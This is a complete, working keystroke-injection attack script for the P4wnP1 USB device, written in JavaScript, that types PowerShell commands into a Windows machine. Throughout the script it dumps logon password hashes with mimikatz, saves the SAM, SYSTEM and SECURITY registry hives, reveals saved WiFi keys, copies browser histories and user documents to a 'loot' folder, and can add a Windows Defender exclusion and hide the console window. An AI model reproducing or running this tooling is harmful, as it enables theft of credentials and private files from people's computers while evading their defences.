/*#########################################################################################################################################\
# AllinOne_extraction.js                                                                                                                   #
#   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs,      #
#   Windows credential databases (SAM, system and security files) and users + passwords (hashes) to P4wnP1 mass storage or to              #
#   another mass storage of your choice.                                                                                                   #
#                                                                                                                                          #
#   Author: chriskalv                                                                                                                      #
#                                                                                                                                          #
# PREREQUISTES:                                                                                                                            #
# - Enable keyboard capability and, if you want to extract directly to P4wnP1's microSD, USB mass storage capability in settings.          #
# - Place browser_booty.exe in P4wnP1:\tools in order to be able to extract browser data (extract_browserdata=true).                       # 
# - Place pw.exe (modified mimikatz) in P4wnP1:\tools in order to be able to extract users & passwords hashes (extract_mimikatz=true).     #
# - Edit global settings below.                                                                                                            #
\#########################################################################################################################################*/


////////////////////////// GLOBAL SETTINGS /////////////////////////\
// GENERAL                                                         // ---
layout("de");                                                      // Keyboard layout
typingSpeed(0,0);                                                  // Typing = really fast
run_as_admin=false;                                                // Set to true to execute powershell as Administrator
extract_to_ssd=true;                                               // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
hide=false;                                                        // Set to true to hide the console window on the target
exit=true;                                                         // Set to true to exit the console once finished
modify_defender=false;                                             // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
var ssd_drive = "exSSD";                                           // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
// FILES EXTRACTION                                                // ---
extract_files=true;                                                // Set to true to enable the extraction of files
extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
var user_subfolder3 = ["Desktop"]                                  // The third folder inside the home user directory to be inspected
var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png"]  // The filetypes to extract from previously specified folders in the home directory
var add_folder = "SoftwareXYZ\\subfolder1\\Screenshots"            // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
// WIFI DATA EXTRACTION                                            // ---
extract_wifi=true;                                                 // Set to true to enable the extraction of WiFi keys
var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
// BROWSER DATA EXTRACTION                                         // ---
extract_browserdata=true;                                          // Set to true to enable the extraction of browser data (history, bookmarks, logs)
// HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION                // ---
extract_folderstructure=true;                                      // Set to true to enable the extraction of the home directory folder/files structure
// LOGON USERS & PASSWORD EXTRACTION                               // ---
extract_mimikatz=false;                                            // Set to true to extract users and passwords (hashes) with mimikatz. Might be problematic to execute if AntiVir is active on the target system.
// WINDOWS CREDENTIALS EXTRACTION                                  // ---
extract_wincreds=false;                                            // Set to true to enable the extraction of Windows credentials dbs (Powershell must be run as Administrator for this to work [run_as_admin=true]). Might be problematic to execute if AntiVir is active on the target system.
////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Identify path/directory names
    if (extract_to_ssd) {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    } else {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
  
  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }
    
  // Create directories
    if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");
    if (extract_folderstructure) type("$lootPathFolders = $usbPath+ '' +$lootfolder+ '\\folder_structure\';mkdir $lootPathFolders;");
    if (extract_browserdata) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\browser_data\';mkdir $lootPathBrowser;");
    if (extract_mimikatz && run_as_admin) type("$lootPathUsersPasswords = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;")
    if (extract_wifi) type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
    if (extract_wincreds && run_as_admin) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
    if (extract_add_folder) type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");  
    delay(100);
  
  // Get files/folder structure of Documents, Downloads, Pictures, Videos and Recycle Bin for current user
    if (extract_folderstructure) { 
        type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $lootPathFolders\\$env:COMPUTERNAME-Documents.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $lootPathFolders\\$env:COMPUTERNAME-Pictures.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $lootPathFolders\\$env:COMPUTERNAME-Videos.txt;tree /F /A $env:USERPROFILE\\Downloads > $lootPathFolders\\$env:COMPUTERNAME-Downloads.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $lootPathFolders\\$env:COMPUTERNAME-RecycleBin.txt\n");    
        delay(5000)
    }
  
  // Get users and passwords (hashes) with mimikatz
    if (extract_mimikatz && run_as_admin) {
        type("cd $usbPath;\n");
        type("cd /tools;\n");
        type('.\\pw.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">> $lootPathUsersPasswords\\$env:UserName`.txt;\n');
        delay(1000)
    }

  // Get browsing history, bookmarks and download logs of all browsers
    if (extract_browserdata) {
        // Copy Chrome, Brave, Edge, and Opera files to USB, as the orig. files are locked
        type('cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" -Destination "$usbPath\\C_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" -Destination "$usbPath\\B_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History" -Destination "$usbPath\\E_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\History" -Destination "$usbPath\\O_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\C_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\B_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\E_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks" -Destination "$usbPath\\O_Bookmarks"\n');
        // Copy Firefox seperately because it insists on being difficult
        type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
        // Execute the .exe in /tools folder
        type('cd $usbPath\\tools; .\\browser_booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
        // Delete the database files now that we've extracted all useful information
        type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n') 
        delay(12000)
    }
  
  // Extract Wifi information/keys
    if (extract_wifi) {
        type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");
        type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;\n")
        delay(2000)
    }
	
  // Extract Windows credentials
    if (extract_wincreds && run_as_admin) {
        type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
        type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
        type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
	delay(4000)
    }
   
  // Copy files of specified filetypes from specified folders (depth: 4 directories)
    if (extract_files) {
        type("$home_directory = Get-Variable HOME -valueOnly;");
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
        }  
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
        }
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder3 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
        }
        if (extract_add_folder) {
            for (var i = 0; i < filetypes_addfolder.length; i++) {
                type("mkdir $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n");
                type("copy $search_dir\\*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                                 
                type("copy $search_dir\\*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                              
                type("copy $search_dir\\*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")
                type("copy $search_dir\\*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")
            }
        }
    }
  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
